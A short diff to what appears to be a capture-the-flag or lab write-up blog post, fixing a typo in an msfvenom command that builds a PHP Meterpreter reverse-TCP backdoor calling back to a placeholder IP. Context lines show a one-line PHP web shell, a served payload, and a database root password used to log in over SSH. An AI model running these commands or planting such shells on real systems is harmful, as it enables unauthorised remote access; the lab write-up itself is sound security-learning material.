@@ -489,7 +489,7 @@ echo system($_GET["cmd"]);
 Once actived I was able to execute code. Now for a meterpreter payload and serve it up with SimpleHTTPServer
 
 {% highlight bash %}
-msfvenom -p php/meterpreter/reverse_tcp LPORT=111.111.111.111 LPORT=444 R > backdoor.php
+msfvenom -p php/meterpreter/reverse_tcp LHOST=111.111.111.111 LPORT=444 R > backdoor.php
 pythom -m SimpleHTTPServer
 {% endhighlight %}
 
@@ -534,7 +534,7 @@ define('DB_USER', 'root');
 define('DB_PASSWORD', 'rootpassword!');
 {% endhighlight %}
 
-Now to test: 
+Now to test:
 
 {% highlight bash %}
 ssh root@vm
